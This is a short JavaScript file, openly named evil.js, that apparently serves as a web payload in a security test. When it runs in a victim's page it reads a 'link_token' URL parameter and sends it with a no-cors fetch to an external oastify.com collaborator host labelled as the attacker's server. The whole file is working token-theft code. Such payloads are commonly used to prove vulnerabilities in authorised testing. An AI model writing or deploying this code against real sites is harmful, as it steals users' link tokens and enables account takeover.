// evil.js - Steal Link Token
(function() {
    // Extract link_token from URL parameters
    const urlParams = new URLSearchParams(window.location.search);
    const linkToken = urlParams.get('link_token');

    if (linkToken) {
        // Send the token to the attacker's Oastify server
        fetch('https://042tev3yyomm6wuyw1lxfuonjepbd51u.oastify.com/steal?token=' + encodeURIComponent(linkToken), {
            mode: 'no-cors' // Using no-cors bypasses cross-origin issues, even though we don't see the response
        });
        console.log('[!] Link Token sent to attacker server');
    } else {
        console.log('[!] No link_token found');
    }
})();
